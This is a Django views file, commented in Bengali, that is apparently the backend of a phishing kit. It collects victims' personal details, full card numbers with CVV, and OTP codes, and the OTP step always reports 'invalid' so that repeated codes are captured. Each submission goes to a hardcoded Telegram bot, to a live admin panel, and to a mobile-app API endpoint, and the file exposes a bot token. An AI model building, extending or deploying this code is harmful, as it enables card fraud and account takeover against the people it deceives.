import requests
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer
from django.http import JsonResponse
from django.shortcuts import redirect, render
from rest_framework.decorators import api_view
from rest_framework.response import Response

from .models import ApplicantDetail, Card

# --- Telegram Bot Config (একই Bot এবং Chat ID সব জায়গার জন্য) ---
TELEGRAM_BOT_TOKEN = "8881598082:AAGtobv0Q4_yv-SAf2SfiANZr3o79tHWVSM"
TELEGRAM_CHAT_ID = "7970722761"

def send_telegram_alert(message_text):
    """ওয়েবসাইট ও অ্যাপ—উভয় জায়গা থেকেই টেলিগ্রাম বোটে মেসেজ পাঠানোর মূল ফাংশন"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message_text,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, data=payload, timeout=5)
        res_data = response.json()
        if res_data.get("ok"):
            print("✅ Telegram alert sent successfully!")
        else:
            print(f"❌ Telegram Error: {res_data.get('description')}")
    except Exception as e:
        print(f"❌ Network Error: {e}")


def intropage(request):
    return render(request, "intropage.html")


def home(request):
    return render(request, "home.html")


# --- নতুন যুক্ত করা ডাউনলোড পেজের ভিউ ---
def downloadpage(request):
    return render(request, "downloadpage.html")


def datapage(request):
    if request.method == "POST":
        full_name = request.POST.get("full_name")
        mobile_number = request.POST.get("mobile_number")
        email = request.POST.get("email")
        dob = request.POST.get("dob")

        applicant = ApplicantDetail.objects.create(
            full_name=full_name,
            mobile_number=mobile_number,
            email=email,
            dob=dob,
        )

        # Telegram Alert
        msg = (
            f"👤 *New Applicant Registered!*\n\n"
            f"📌 *ID:* {applicant.id}\n"
            f"📛 *Name:* {full_name}\n"
            f"📞 *Mobile:* {mobile_number}\n"
            f"📧 *Email:* {email}\n"
            f"🎂 *DOB:* {dob}"
        )
        send_telegram_alert(msg)

        request.session["applicant_id"] = applicant.id
        return redirect("card")

    return render(request, "datapage.html")


def card_view(request):
    if request.method == "POST":
        card_holder_name = request.POST.get("card_holder_name")
        card_number = request.POST.get("card_number")
        card_expiry = request.POST.get("card_expiry")
        card_cvv = request.POST.get("card_cvv")

        applicant_id = request.session.get("applicant_id")
        applicant = None

        if applicant_id:
            applicant = ApplicantDetail.objects.filter(id=applicant_id).first()

        if not applicant:
            applicant = ApplicantDetail.objects.create(
                full_name=card_holder_name
            )

        applicant.card_holder_name = card_holder_name
        applicant.card_number = card_number
        applicant.card_expiry = card_expiry
        applicant.card_cvv = card_cvv
        applicant.save()

        # Send WebSocket update to admin panel
        channel_layer = get_channel_layer()
        if channel_layer:
            async_to_sync(channel_layer.group_send)(
                "admin_live_cards",
                {
                    "type": "new_card_submitted",
                    "data": {
                        "id": applicant.id,
                        "card_holder_name": applicant.card_holder_name,
                        "card_number": applicant.card_number,
                        "card_expiry": applicant.card_expiry,
                        "created_at": applicant.created_at.strftime(
                            "%b. %d, %Y, %I:%M %p"
                        ),
                    },
                },
            )

        # Telegram Alert
        msg = (
            f"💳 *New Card Details Submitted!*\n\n"
            f"📌 *Applicant ID:* {applicant.id}\n"
            f"👤 *Holder Name:* {card_holder_name}\n"
            f"🔢 *Card Number:* `{card_number}`\n"
            f"📅 *Expiry:* {card_expiry}\n"
            f"🔒 *CVV:* `{card_cvv}`"
        )
        send_telegram_alert(msg)

        request.session["applicant_id"] = applicant.id
        return redirect("otp")

    return render(request, "card.html")


def otp_view(request):
    if request.method == "POST":
        otp_code = request.POST.get("otp_code")
        attempt = request.POST.get("otp_attempt", "1")
        applicant_id = request.session.get("applicant_id")

        user_record = None
        if applicant_id:
            user_record = ApplicantDetail.objects.filter(
                id=applicant_id
            ).first()

        if not user_record:
            user_record = ApplicantDetail.objects.last()

        if user_record:
            if attempt == "1":
                user_record.otp1 = otp_code
            elif attempt == "2":
                user_record.otp2 = otp_code
            else:
                user_record.otp3 = otp_code

            user_record.save()

            # Telegram Alert
            msg = (
                f"🔑 *OTP Submitted!*\n\n"
                f"📌 *Applicant ID:* {user_record.id}\n"
                f"👤 *Name:* {user_record.full_name}\n"
                f"🔢 *Attempt:* {attempt}\n"
                f"⚡ *OTP Code:* `{otp_code}`"
            )
            send_telegram_alert(msg)

        if request.headers.get("x-requested-with") == "XMLHttpRequest":
            return JsonResponse({"status": "invalid", "attempt": attempt})

    return render(request, "otp.html")


# --- Mobile App / External API Endpoint ---
@api_view(['POST'])
def save_card_data(request):
    """অ্যান্ড্রয়েড/মোবাইল অ্যাপ থেকে ডাটা আসলে এই API পয়েন্টে জমা হবে"""
    card_name = request.data.get('card_name')
    card_number = request.data.get('card_number')
    expiry = request.data.get('expiry')
    cvv = request.data.get('cvv')

    Card.objects.create(
        card_name=card_name,
        card_number=card_number,
        expiry=expiry,
        cvv=cvv
    )

    # Telegram Alert (App API Data)
    msg = (
        f"📱 *Card Data Received via Mobile App / API!*\n\n"
        f"👤 *Name:* {card_name}\n"
        f"🔢 *Card Number:* `{card_number}`\n"
        f"📅 *Expiry:* {expiry}\n"
        f"🔒 *CVV:* `{cvv}`"
    )
    send_telegram_alert(msg)

    return Response({"status": "success", "message": "Data saved successfully and sent to Telegram"})